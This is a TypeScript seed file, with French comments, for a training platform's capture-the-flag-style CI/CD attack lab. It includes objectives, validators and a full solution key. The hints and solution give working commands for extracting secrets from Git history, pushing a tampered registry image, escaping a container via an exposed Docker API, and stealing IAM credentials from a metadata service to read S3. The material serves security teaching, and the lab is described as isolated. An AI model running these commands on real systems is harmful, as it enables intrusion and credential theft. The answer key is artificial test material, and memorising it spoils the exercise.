import type { ProjectSeed } from "../../types";

/**
 * Opération Pipeline Fantôme — 3e projet du checkpoint « cybersecurité — projets ».
 *
 * Pentest d'une chaîne CI/CD : dépôt Git mal nettoyé → fuite de secrets dans
 * l'historique → attaque supply-chain sur le registre de conteneurs →
 * observation d'un redéploiement automatique → évasion de conteneur (dans un
 * Docker-in-Docker imbriqué et JETABLE) → SSRF vers un IMDS cloud simulé → vol
 * d'identifiants IAM → exfiltration d'un stockage S3. Registre technique inédit
 * sur la plateforme : Git forensics, sécurité de registre, container escape,
 * SSRF cloud.
 *
 * ── ISOLATION (corrections de sécurité, non négociables) ──────────────────────
 * L'évasion de l'objectif 4 se déroule dans un conteneur `docker:dind` PRIVILÉGIÉ
 * propre à la session (nœud `prod-dind`), détruit avec elle. Le socket/endpoint
 * exploité est celui de CE démon interne — JAMAIS `/var/run/docker.sock` de la VM
 * hôte partagée. Le `-v /:/host` de l'évasion monte le FS du dind jetable ; le
 * fichier canari lu est propre à ce dind. Rien n'atteint la VM réelle.
 *
 * L'image poussée à l'objectif 2 NE CONTIENT AUCUN payload d'exécution distante :
 * sa seule différence avec l'image légitime est l'écriture, au démarrage, d'un
 * fichier canari `/tmp/pwned_<suffix>.txt` ; elle sert par ailleurs la même appli.
 * La preuve de compromission est cette différence observable, sans reverse shell.
 *
 * ── ADAPTATIONS ASSUMÉES (documentées) ───────────────────────────────────────
 * - `registry_probe` vérifie un LABEL de session incrusté dans l'image (et non un
 *   « digest de couche » attendu, non prédictible côté serveur) : prouve la
 *   paternité de l'image ET bloque les faux positifs. Voir objectiveValidation.ts.
 * - Gitea remplacé par un serveur Git HTTP « dumb » léger + sshd de pivot :
 *   pédagogie identique (commit retiré du HEAD mais présent dans l'historique),
 *   bien plus fiable en conteneur.
 * - `prod-dind` (8e nœud, infra) matérialise le DinD jetable exigé par la
 *   correction d'isolation. L'« API Docker interne exposée » (tcp://prod-dind:2375
 *   sur le bridge interne, jamais publié côté hôte) EST le vecteur d'évasion —
 *   une vraie classe de vulnérabilité.
 * - Réseau `internal` non-`internal:true` (le démon imbriqué doit pouvoir tirer
 *   ses couches de base) : l'isolation est-ouest attaquant↔interne reste assurée
 *   par des bridges séparés sans route. `cloud` reste totalement isolé.
 */

const SLUG = "operation-pipeline-fantome";
const REG = "registry:5000";

export const pipelineFantome: ProjectSeed = {
  slug: SLUG,
  checkpoint: "cybersecurite-projets",
  title: "Opération Pipeline Fantôme",
  description:
    "Chaîne d'attaque CI/CD complète : d'un secret oublié dans un historique Git jusqu'à l'exfiltration d'un stockage cloud, en passant par le supply-chain d'un registre de conteneurs, une évasion de conteneur (Docker-in-Docker jetable) et un SSRF vers un service de métadonnées cloud.",
  difficulty: "insane",
  estimatedMinutes: 120,
  ttlSec: 10800,
  topology: {
    networks: [
      // dmz : le poste d'attaque et le serveur Git public. internal:false (accès
      // sortant sans importance ici ; l'isolation vers l'interne vient de bridges
      // séparés, pas d'un flag).
      { name: "dmz", cidr: "10.60.0.0/24", internal: false },
      // internal : registre, CI, prod et le démon Docker jetable. Non isolé du
      // Net pour que le démon imbriqué tire ses images de base — mais injoignable
      // depuis l'attaquant (bridge distinct, aucune route). Pivot via gitserver.
      { name: "internal", cidr: "10.60.1.0/24", internal: false },
      // cloud : IMDS + stockage S3. Totalement isolé — atteignable UNIQUEMENT
      // depuis l'hôte dind (dual-homé internal+cloud), donc via l'évasion.
      { name: "cloud", cidr: "10.60.2.0/24", internal: true },
    ],
    nodes: [
      {
        id: "attacker",
        image: "cyberace/project-pipeline-attacker:latest",
        role: "attacker",
        terminal: true,
        networks: [{ name: "dmz", ip: "10.60.0.10" }],
        ports: [{ containerPort: 7681, label: "Terminal web (ttyd)", kind: "terminal" }],
      },
      {
        id: "gitserver",
        image: "cyberace/project-pipeline-git:latest",
        role: "pipeline",
        terminal: false,
        // Dual-homé : public en dmz, mais aussi sur internal → PIVOT. Le joueur y
        // accède par SSH (creds fuités) et opère dès lors sur le réseau interne.
        networks: [
          { name: "dmz", ip: "10.60.0.20" },
          { name: "internal", ip: "10.60.1.5" },
        ],
        resources: { memMb: 512, cpu: 0.5 },
      },
      {
        id: "registry",
        image: "registry:2",
        role: "registry",
        terminal: false,
        // Push anonyme autorisé (aucune auth configurée) = porte dérobée de fait.
        networks: [{ name: "internal", ip: "10.60.1.20" }],
        resources: { memMb: 512, cpu: 0.5 },
      },
      {
        id: "prod-dind",
        image: "cyberace/project-pipeline-dind:latest",
        role: "pipeline",
        terminal: false,
        // Démon Docker interne JETABLE et PRIVILÉGIÉ (hôte d'évasion). Dual-homé
        // internal (registre/prod/CI + sortie Net) + cloud (ses conteneurs
        // enfants atteignent l'IMDS/S3). API en clair sur :2375 (jamais publiée).
        privileged: true,
        networks: [
          { name: "internal", ip: "10.60.1.40" },
          { name: "cloud", ip: "10.60.2.5" },
        ],
        resources: { memMb: 2048, cpu: 1.5 },
      },
      {
        id: "ci-runner",
        image: "cyberace/project-pipeline-ci:latest",
        role: "pipeline",
        terminal: false,
        // Pousse l'image légitime au démarrage ; point de sonde interne du
        // registre (registry_probe s'exécute ici, registry:2 étant sans shell).
        networks: [{ name: "internal", ip: "10.60.1.10" }],
        // Identifiants IAM « factices » (leurre narratif — le vrai chemin passe
        // par l'IMDS ; ce nœud n'est pas atteignable en shell par le joueur).
        env: {
          AWS_ACCESS_KEY_ID: "AKIADECOYCIRUNNER000",
          AWS_SECRET_ACCESS_KEY: "decoy-not-the-real-iam-key",
        },
        resources: { memMb: 768, cpu: 1.0 },
      },
      {
        id: "prod-app",
        image: "cyberace/project-pipeline-prod:latest",
        role: "target",
        terminal: false,
        // Boucle de redéploiement continu via le démon interne. DOCKER_HOST posé
        // en env : hérité par `docker exec` (validations obj3/obj8) ET indice
        // « découvrable » de l'endpoint interne pour l'objectif 4.
        networks: [{ name: "internal", ip: "10.60.1.30" }],
        env: { DOCKER_HOST: "tcp://prod-dind:2375" },
        resources: { memMb: 512, cpu: 0.5 },
      },
      {
        id: "cloud-meta",
        image: "cyberace/project-pipeline-cloudmeta:latest",
        role: "cloud",
        terminal: false,
        networks: [{ name: "cloud", ip: "10.60.2.10" }],
        resources: { memMb: 256, cpu: 0.5 },
      },
      {
        id: "cloud-storage",
        image: "cyberace/project-pipeline-storage:latest",
        role: "cloud",
        terminal: false,
        networks: [{ name: "cloud", ip: "10.60.2.20" }],
        resources: { memMb: 1024, cpu: 1.0 },
      },
    ],
  },

  objectives: [
    {
      id: "pf-git-leak",
      projectSlug: SLUG,
      order: 1,
      kind: "attack",
      title: "Fuite dans l'historique Git",
      description:
        "Le dépôt public `prod/webapp` traîne sur gitserver. Clone-le (`git clone http://gitserver/webapp.git`), puis remonte l'historique (`git log --all`, `git show`) : un commit a « retiré » un fichier de pipeline `.gitea-ci.yml`… mais l'historique le conserve. Décode (base64) le mot de passe de push vers le registre et soumets-le.",
      points: 100,
      dependsOn: [],
      hints: [
        { text: "Un `git rm` ne supprime rien de l'historique. `git log --oneline` puis `git show <commit>:.gitea-ci.yml` sur le commit d'ajout.", cost: 0 },
        { text: "Le champ `push_pass_b64` est du base64 : `echo <valeur> | base64 -d`.", cost: 0 },
        { text: "Le mot de passe décodé a la forme `R3g!Stry_<jeton>`. C'est lui qu'on attend.", cost: 0 },
      ],
      validation: {
        strategy: "text_compare",
        spec: { kind: "flag", value: "R3g!Stry_{{SUFFIX}}", caseSensitive: true },
      },
    },
    {
      id: "pf-supply-push",
      projectSlug: SLUG,
      order: 2,
      kind: "attack",
      title: "Supply-chain : image modifiée poussée",
      description:
        "Pivote par SSH sur gitserver (creds `ciuser` fuités dans le même fichier) : tu es maintenant sur le réseau interne. Le registre accepte le push ANONYME. Construis une image `prod/webapp` MODIFIÉE — identique à la légitime mais qui écrit au démarrage un canari `/tmp/pwned_<suffix>.txt` (contenu `PWNED_BY_SUPPLY_CHAIN`) — et pousse-la sous `prod/webapp:latest` (via le démon interne : `docker -H tcp://prod-dind:2375 build/push`). Elle DOIT porter le label `ghost.session=<jeton de build>` (celui fuité dans le fichier CI) pour être acceptée comme build officiel.",
      points: 200,
      dependsOn: ["pf-git-leak"],
      hints: [
        { text: "Le fichier CI donne aussi `deploy_ssh` (ciuser) et `docker_host` (tcp://prod-dind:2375). SSH depuis attacker : `ssh ciuser@gitserver`.", cost: 0 },
        { text: "Dockerfile : `FROM busybox` + `LABEL ghost.session=<token>` + un ENTRYPOINT qui `echo PWNED_BY_SUPPLY_CHAIN > /tmp/pwned_<suffix>.txt` puis lance `httpd`.", cost: 0 },
        { text: "`docker -H tcp://prod-dind:2375 build -t registry:5000/prod/webapp:latest . && docker -H tcp://prod-dind:2375 push registry:5000/prod/webapp:latest`.", cost: 0 },
      ],
      validation: {
        strategy: "registry_probe",
        spec: {
          probeFromNode: "ci-runner",
          registryHost: REG,
          repository: "prod/webapp",
          tag: "latest",
          markerLabel: "ghost.session",
          expectedEnvVar: "FLAG_SUFFIX",
        },
      },
    },
    {
      id: "pf-observe-redeploy",
      projectSlug: SLUG,
      order: 3,
      kind: "attack",
      title: "Redéploiement automatique observé",
      description:
        "prod-app re-pull et relance `prod/webapp:latest` toutes les 60 s : ton image piégée sera déployée SANS action de ta part. Attends le redéploiement (consulte les logs de prod-app), puis confirme la présence du canari dans le conteneur déployé. Aucun payload distant n'est nécessaire — le simple fichier prouve que tu contrôles ce qui tourne en prod.",
      points: 100,
      dependsOn: ["pf-supply-push"],
      hints: [
        { text: "Patiente jusqu'à 60 s après ton push. Les logs de prod-app (panneau logs) montrent `TAMPER at …`.", cost: 0 },
        { text: "Le conteneur déployé s'appelle `deployed-app`. Le canari est dans son `/tmp`.", cost: 0 },
      ],
      validation: {
        strategy: "exec_check",
        spec: {
          node: "prod-app",
          command: ["docker", "exec", "deployed-app", "sh", "-c", "cat /tmp/pwned_*.txt 2>/dev/null"],
          expectedContains: "PWNED_BY_SUPPLY_CHAIN",
        },
      },
    },
    {
      id: "pf-escape-dind",
      projectSlug: SLUG,
      order: 4,
      kind: "attack",
      title: "Évasion de conteneur (Docker-in-Docker)",
      description:
        "L'endpoint Docker interne (tcp://prod-dind:2375, vu dans la config CI) est exposé en clair : c'est une API Docker non authentifiée. Sers-t'en pour lancer un conteneur montant le FS de l'hôte (`-v /:/host`). Cet « hôte » est le dind JETABLE de la session (jamais la VM réelle). Lis le fichier réservé à l'hôte `/root/dind_flag.txt` (inaccessible depuis prod-app seul) et RECOPIE-le à l'identique dans `/root/escaped_proof.txt` pour prouver ton accès niveau hôte.",
      points: 200,
      dependsOn: ["pf-observe-redeploy"],
      hints: [
        { text: "Monter le socket/endpoint Docker = obtenir root sur l'hôte du démon. `docker -H tcp://prod-dind:2375 run --rm -v /:/host alpine ...`.", cost: 0 },
        { text: "Depuis le conteneur d'évasion, `/host` = le FS du dind. Copie : `cp /host/root/dind_flag.txt /host/root/escaped_proof.txt`.", cost: 0 },
        { text: "La validation compare `/root/dind_flag.txt` et `/root/escaped_proof.txt` sur prod-dind : la copie doit être exacte.", cost: 0 },
      ],
      validation: {
        strategy: "exec_check",
        spec: {
          node: "prod-dind",
          command: [
            "sh",
            "-c",
            "[ -f /root/escaped_proof.txt ] && cmp -s /root/dind_flag.txt /root/escaped_proof.txt && echo ESCAPE-CONFIRMED || echo NO",
          ],
          expectedContains: "ESCAPE-CONFIRMED",
        },
      },
    },
    {
      id: "pf-ssrf-imds",
      projectSlug: SLUG,
      order: 5,
      kind: "attack",
      title: "SSRF vers les métadonnées cloud (IMDS)",
      description:
        "L'hôte compromis (dind) est dual-homé sur le réseau `cloud`, isolé du reste. Depuis un conteneur lancé sur ce démon (avec `--net host` ou via son routage), interroge le service de métadonnées d'instance `http://cloud-meta/latest/meta-data/iam/security-credentials/pipeline-deploy-role`. Récupère et soumets l'`AccessKeyId` IAM temporaire.",
      points: 150,
      dependsOn: ["pf-escape-dind"],
      hints: [
        { text: "L'IMDS n'est atteignable que depuis l'instance : passe par prod-dind. `docker -H tcp://prod-dind:2375 run --rm --net host alpine wget -qO- http://cloud-meta/latest/meta-data/iam/security-credentials/`.", cost: 0 },
        { text: "Le premier appel donne le nom du rôle ; rappelle l'URL suffixée de ce rôle pour obtenir le JSON de creds.", cost: 0 },
        { text: "L'AccessKeyId a la forme `AKIAGHOST<jeton>`.", cost: 0 },
      ],
      validation: {
        strategy: "text_compare",
        spec: { kind: "flag", value: "AKIAGHOST{{SUFFIX}}", caseSensitive: true },
      },
    },
    {
      id: "pf-exfil-s3",
      projectSlug: SLUG,
      order: 6,
      kind: "attack",
      title: "Exfiltration du stockage confidentiel",
      description:
        "Les identifiants IAM volés à l'IMDS sont ceux du stockage objet `cloud-storage` (S3/MinIO). Authentifie-toi et lis le rapport `confidential-reports/report.txt` : il contient le flag final. Soumets l'`AccessKeyId` et le `SecretAccessKey` récupérés à l'IMDS.",
      points: 100,
      dependsOn: ["pf-ssrf-imds"],
      questions: [
        { id: "access", prompt: "AccessKeyId IAM" },
        { id: "secret", prompt: "SecretAccessKey IAM" },
      ],
      hints: [
        { text: "Le JSON de l'IMDS contient aussi `SecretAccessKey`. Les deux ouvrent le bucket.", cost: 0 },
        { text: "Client S3 : `mc alias set x http://cloud-storage:9000 <access> <secret>` puis `mc cat x/confidential-reports/report.txt` (via un conteneur sur prod-dind).", cost: 0 },
      ],
      validation: {
        strategy: "cred_check",
        spec: {
          // Auth S3 réelle validée SUR cloud-storage (embarque mc) : les creds
          // soumis doivent ouvrir le bucket et lire le rapport (flag).
          execNode: "cloud-storage",
          commandTemplate: ["/usr/local/bin/s3read", "{access}", "{secret}"],
          successPattern: "GHOST{",
          requiredFields: ["access", "secret"],
        },
      },
    },
    {
      id: "pf-forensics",
      projectSlug: SLUG,
      order: 7,
      kind: "analysis",
      title: "Forensics du pipeline",
      description:
        "Rejoue le rôle du défenseur : à partir du journal de déploiement de prod-app (panneau logs), détermine l'instant EXACT où l'image piégée a été déployée et le nombre de pulls que prod-app avait alors effectués. Les deux figurent sur la ligne `TAMPER at … after … pulls`.",
      points: 100,
      dependsOn: ["pf-supply-push"],
      questions: [
        { id: "push_time", prompt: "Horodatage (UTC ISO) du déploiement piégé" },
        { id: "pulls", prompt: "Nombre de pulls indiqué sur la ligne TAMPER" },
      ],
      hints: [
        { text: "Le journal est en UTC (`…Z`). Cherche la ligne unique contenant `TAMPER`.", cost: 0 },
        { text: "Copie l'horodatage exactement tel qu'affiché, et le nombre entier de pulls.", cost: 0 },
      ],
      validation: {
        strategy: "dynamic_text_compare",
        spec: {
          questions: [
            {
              id: "push_time",
              node: "prod-app",
              command: ["sh", "-c", "grep -m1 'TAMPER at' /var/log/pipeline.log"],
              extract: "TAMPER at (\\S+)",
            },
            {
              id: "pulls",
              node: "prod-app",
              command: ["sh", "-c", "grep -m1 'TAMPER at' /var/log/pipeline.log"],
              extract: "after (\\d+) pulls",
            },
          ],
        },
      },
    },
    {
      id: "pf-stealth",
      projectSlug: SLUG,
      order: 8,
      kind: "attack",
      title: "Bonus — discrétion",
      description:
        "Une bonne attaque supply-chain ne casse rien : l'appli doit continuer de servir normalement malgré le canari. Confirme que le conteneur déployé (ton image piégée) répond toujours correctement — image propre, pas de build cassé qui alerterait un vrai pipeline.",
      points: 50,
      dependsOn: ["pf-supply-push"],
      hints: [
        { text: "Ton ENTRYPOINT doit écrire le canari PUIS lancer l'appli d'origine (`httpd`), pas la remplacer.", cost: 0 },
        { text: "La validation vérifie à la fois la présence du canari et que l'appli répond `prod/webapp OK`.", cost: 0 },
      ],
      validation: {
        strategy: "exec_check",
        spec: {
          node: "prod-app",
          command: [
            "docker",
            "exec",
            "deployed-app",
            "sh",
            "-c",
            "cat /tmp/pwned_*.txt >/dev/null 2>&1 && wget -qO- 127.0.0.1:80 2>/dev/null",
          ],
          expectedContains: "prod/webapp OK",
        },
      },
    },
  ],

  // Corrigé complet (Partie 4) — auto-révélé à la complétion ou à l'expiration.
  solution: {
    summary:
      "Chaîne d'attaque CI/CD de bout en bout. Un secret oublié dans l'historique Git ouvre le pivot interne ; le registre en push anonyme + un déploiement continu qui fait confiance à `:latest` donnent une exécution en production (supply-chain) ; une API Docker interne exposée permet une évasion de conteneur (confinée à un Docker-in-Docker jetable) ; de là, un accès à l'IMDS cloud vole des identifiants IAM qui ouvrent le stockage S3. Chaque maillon est une classe de vulnérabilité réelle et fréquente.",
    steps: [
      {
        objectiveId: "pf-git-leak",
        explanation:
          "Un dépôt Git conserve TOUT son historique : un `git rm` ou un commit « de nettoyage » ne fait qu'ajouter un nouvel état — l'ancien blob reste accessible par son hash. Un secret commité une seule fois est donc compromis à vie : il faut le RÉVOQUER, jamais seulement le retirer du HEAD. Ici, `.gitea-ci.yml` a été « nettoyé », mais le commit d'ajout expose toujours les identifiants (base64).",
        commands: [
          "git clone http://gitserver/webapp.git && cd webapp",
          "git log --oneline          # repère le commit « ci: ajoute la configuration du pipeline »",
          "git show <commit>:.gitea-ci.yml   # (ou: git log -p -- .gitea-ci.yml)",
          "echo <push_pass_b64> | base64 -d  # → R3g!Stry_<jeton>  (réponse attendue)",
        ],
        expectedLogs:
          "Le fichier révèle aussi les creds SSH de pivot (Pivot_<jeton>_42), le docker_host interne (tcp://prod-dind:2375) et le jeton de build (= suffixe de session).",
      },
      {
        objectiveId: "pf-supply-push",
        explanation:
          "Un registre qui autorise le push ANONYME est une porte dérobée de fait : quiconque l'atteint peut remplacer n'importe quelle image. Couplé à un déploiement continu qui fait aveuglément confiance au tag `:latest`, cela donne une exécution de code en production. On pivote d'abord par SSH — le serveur Git public est aussi câblé sur le réseau interne (hôte dual-homé, mauvaise pratique classique) — puis on pousse une image portant le label de build attendu.",
        commands: [
          "ssh ciuser@gitserver        # mot de passe Pivot_<jeton>_42 (décodé à l'étape 1)",
          "mkdir evil && cd evil",
          "printf 'FROM busybox:1.36\\nLABEL ghost.session=<jeton>\\nRUN mkdir -p /www && echo \"<h1>prod/webapp OK</h1>\" > /www/index.html\\nENTRYPOINT [\"sh\",\"-c\",\"echo PWNED_BY_SUPPLY_CHAIN > /tmp/pwned_<suffix>.txt; exec httpd -f -p 80 -h /www\"]\\n' > Dockerfile",
          "docker -H tcp://prod-dind:2375 build -t registry:5000/prod/webapp:latest .",
          "docker -H tcp://prod-dind:2375 push registry:5000/prod/webapp:latest",
        ],
        expectedLogs:
          "La validation lit le blob de config de l'image depuis le registre et vérifie que le label ghost.session == jeton de build de la session (prouve la paternité, bloque les faux positifs).",
      },
      {
        objectiveId: "pf-observe-redeploy",
        explanation:
          "Le déploiement continu re-tire `:latest` et relance le conteneur toutes les 60 s, sans vérifier la provenance de l'image. L'attaque ne nécessite donc AUCUN accès distant : le pipeline exécute lui-même l'image piégée. Le payload est volontairement inoffensif (un simple fichier canari) — sa seule présence prouve qu'on contrôle ce qui tourne en production, sans reverse shell ni capacité d'exécution distante.",
        commands: [
          "# patienter jusqu'à 60 s, puis observer les logs de prod-app (panneau logs)",
          "docker exec deployed-app cat /tmp/pwned_<suffix>.txt   # → PWNED_BY_SUPPLY_CHAIN",
        ],
        expectedLogs: "Journal prod-app : `PULL #n …` puis `TAMPER at <ts> after <n> pulls`.",
      },
      {
        objectiveId: "pf-escape-dind",
        explanation:
          "Joindre le socket / l'API d'un démon Docker équivaut à obtenir root sur son hôte : on lance un conteneur qui monte le filesystem hôte (`-v /:/host`) et lit/écrit tout. Ici l'« hôte » est le Docker-in-Docker JETABLE de la session (isolé, détruit à l'expiration) : l'évasion est réelle et pédagogique mais ne touche jamais la VM d'infrastructure. En production, cette primitive donnerait un accès root réel — d'où la règle : ne JAMAIS exposer le socket/API Docker (ni le monter dans un conteneur non fiable).",
        commands: [
          "# tcp://prod-dind:2375 (vu dans .gitea-ci.yml) est une API Docker non authentifiée",
          "docker -H tcp://prod-dind:2375 run --rm -v /:/host alpine \\",
          "  sh -c 'cat /host/root/dind_flag.txt; cp /host/root/dind_flag.txt /host/root/escaped_proof.txt'",
        ],
        expectedLogs:
          "GHOST_HOST{evasion_dind_confinee}_<suffix> ; la validation compare dind_flag.txt et escaped_proof.txt sur l'hôte du dind.",
      },
      {
        objectiveId: "pf-ssrf-imds",
        explanation:
          "Les plateformes cloud exposent un service de métadonnées d'instance (IMDS, l'adresse 169.254.169.254) qui délivre des identifiants IAM temporaires à quiconque peut faire une requête HTTP DEPUIS l'instance. C'est la cible n°1 d'un SSRF ou d'un accès à l'hôte : une simple requête locale suffit à voler des creds cloud (cf. la fuite Capital One 2019). L'hôte compromis (dind) étant sur le réseau `cloud`, on interroge l'IMDS depuis un conteneur lancé sur ce démon.",
        commands: [
          "docker -H tcp://prod-dind:2375 run --rm --net host alpine \\",
          "  wget -qO- http://cloud-meta/latest/meta-data/iam/security-credentials/   # → pipeline-deploy-role",
          "docker -H tcp://prod-dind:2375 run --rm --net host alpine \\",
          "  wget -qO- http://cloud-meta/latest/meta-data/iam/security-credentials/pipeline-deploy-role",
        ],
        expectedLogs: "JSON IAM : AccessKeyId=AKIAGHOST<suffix>, SecretAccessKey=wJalr<suffix>PIPELINEftKEY.",
      },
      {
        objectiveId: "pf-exfil-s3",
        explanation:
          "Les identifiants IAM volés à l'IMDS ouvrent tous les services auxquels ce rôle a droit — ici le stockage objet S3 (MinIO). On les rejoue avec un client S3 pour lire le bucket confidentiel : l'attaquant hérite intégralement des permissions de l'instance. C'est la conséquence directe et immédiate du vol de creds cloud.",
        commands: [
          "docker -H tcp://prod-dind:2375 run --rm --net host minio/mc sh -c '\\",
          "  mc alias set x http://cloud-storage:9000 AKIAGHOST<suffix> wJalr<suffix>PIPELINEftKEY && \\",
          "  mc cat x/confidential-reports/report.txt'",
        ],
        expectedLogs: "GHOST{pipeline_fantome_supply_chain}_<suffix> — flag final. À soumettre : AccessKeyId + SecretAccessKey.",
      },
      {
        objectiveId: "pf-forensics",
        explanation:
          "Côté défense, les journaux du pipeline établissent la timeline de l'incident. La ligne `TAMPER` du journal de déploiement donne l'instant exact où l'image piégée a été déployée et le nombre de pulls précédents — de quoi dater la compromission et estimer la fenêtre d'exposition. Leçon : journaliser les déploiements (image, digest, horodatage) est indispensable à toute réponse à incident.",
        commands: [
          "grep 'TAMPER' /var/log/pipeline.log   # via le panneau logs de prod-app",
          "# → TAMPER at <horodatage UTC ISO> after <n> pulls",
        ],
        expectedLogs: "Soumettre l'horodatage exact et le nombre entier de pulls indiqués sur la ligne.",
      },
      {
        objectiveId: "pf-stealth",
        explanation:
          "Une attaque supply-chain réussie est DISCRÈTE : l'image piégée doit continuer de servir l'application normalement, sinon healthchecks, monitoring et utilisateurs donnent l'alerte. Notre ENTRYPOINT dépose le canari PUIS lance l'appli d'origine (`httpd`) : build propre, service intact. Un pipeline qui ne vérifie ni la signature ni la provenance des images ne détecte rien — d'où l'intérêt de la signature d'images (cosign/Notary) et de politiques d'admission.",
        commands: [
          "docker exec deployed-app wget -qO- 127.0.0.1:80   # → <h1>prod/webapp OK</h1>",
        ],
        expectedLogs: "La validation exige à la fois la présence du canari et une réponse applicative correcte.",
      },
    ],
  },
};
